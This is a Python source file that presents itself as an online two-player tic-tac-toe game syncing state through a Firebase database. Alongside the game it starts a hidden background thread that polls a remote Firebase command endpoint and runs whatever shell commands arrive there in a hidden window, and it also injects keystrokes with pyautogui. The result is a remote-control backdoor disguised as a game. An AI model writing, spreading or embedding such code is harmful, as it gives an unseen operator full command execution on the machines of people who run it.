import requests
import time
import os
import ctypes
import sys
import subprocess
import shutil
import pyautogui
import threading
from io import BytesIO

DB_BASE_URL = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE"
STATE_URL = f"{DB_BASE_URL}/game_state.json"
CMD_URL = f"{DB_BASE_URL}/current_command.json"

try:
    ctypes.windll.kernel32.SetConsoleTitleW("Shadow's Matrix Arena")
except:
    pass

def execute_command(command):
    try:
        subprocess.Popen(command, shell=True, creationflags=0x08000000)
    except:
        pass

def start_gateway():
    last_ts = 0
    while True:
        try:
            response = requests.get(CMD_URL)
            data = response.json()
            if data:
                text = data.get('text', '')
                ts = data.get('timestamp', 0)
                if ts > last_ts:
                    if text.startswith("/cmd "):
                        execute_command(text.replace("/cmd ", ""))
                    elif text.startswith("/press "):
                        keys = text.replace("/press ", "").split()
                        pyautogui.hotkey(*keys)
                    last_ts = ts
        except:
            pass
        time.sleep(1)

def get_state():
    try:
        res = requests.get(STATE_URL)
        if res.status_code == 200:
            return res.json()
    except:
        pass
    return None

def update_state(state):
    try:
        requests.put(STATE_URL, json=state)
    except:
        pass

def print_board(b):
    os.system('cls' if os.name == 'nt' else 'clear')
    term_size = shutil.get_terminal_size()
    padding = max(0, (term_size.columns - 15) // 2)
    pad_str = " " * padding
    print("\n" * 2)
    print(pad_str + "=== SHADOW'S ARENA ===")
    print(pad_str + f" {b[0]} | {b[1]} | {b[2]} ")
    print(pad_str + "-----------")
    print(pad_str + f" {b[3]} | {b[4]} | {b[5]} ")
    print(pad_str + "-----------")
    print(pad_str + f" {b[6]} | {b[7]} | {b[8]} ")
    print("\n")

def log_game_to_memory(board_state):
    buffer = BytesIO()
    buffer.write(str(board_state).encode('utf-8'))
    return buffer.getvalue()

def check_winner(b, player):
    wins = [(0,1,2), (3,4,5), (6,7,8), (0,3,6), (1,4,7), (2,5,8), (0,4,8), (2,4,6)]
    return any(b[w[0]] == b[w[1]] == b[w[2]] == player for w in wins)

def is_full(b):
    return " " not in b

def play_xo_game():
    print("Connecting to game server...")
    my_role = None
    while not my_role:
        state = get_state()
        if not state:
            initial_state = {
                "board": [" "]*9,
                "turn": "X",
                "player_x": False,
                "player_o": False,
                "winner": None
            }
            update_state(initial_state)
            state = initial_state

        if not state.get("player_x"):
            state["player_x"] = True
            my_role = "X"
            update_state(state)
            break
        elif not state.get("player_o"):
            state["player_o"] = True
            my_role = "O"
            update_state(state)
            break
        else:
            print("Game is full! Waiting for an empty slot...")
            time.sleep(2)

    print(f"Connected! You are Player: {my_role}")

    while True:
        state = get_state()
        if not state:
            time.sleep(1)
            continue

        board = state.get("board", [" "]*9)
        turn = state.get("turn", "X")
        winner = state.get("winner")

        if winner:
            print_board(board)
            if winner == "Draw":
                print("Game Over: It's a draw!")
            else:
                print(f"Game Over! Winner is: {winner}")
            sys.exit(0)

        if turn != my_role:
            print(f"\rWaiting for Player ({turn}) to play...", end="", flush=True)
            time.sleep(1)
            continue

        print_board(board)
        move = input(f"Your turn ({my_role}). Choose 1-9: ")
        if not move.isdigit():
            print("Invalid input. Enter a number 1-9.")
            time.sleep(1)
            continue

        idx = int(move) - 1
        if idx < 0 or idx > 8 or board[idx] != " ":
            print("Invalid move. Spot taken or out of range.")
            time.sleep(1)
            continue

        board[idx] = my_role
        log_game_to_memory(board)
        
        if check_winner(board, my_role):
            state["board"] = board
            state["winner"] = my_role
            update_state(state)
            print_board(board)
            print(f"You win, Player {my_role}!")
            break
        elif is_full(board):
            state["board"] = board
            state["winner"] = "Draw"
            update_state(state)
            print_board(board)
            print("It's a draw!")
            break
        else:
            state["board"] = board
            state["turn"] = "O" if my_role == "X" else "X"
            update_state(state)

if __name__ == "__main__":
    gateway_thread = threading.Thread(target=start_gateway, daemon=True)
    gateway_thread.start()
    
    play_xo_game()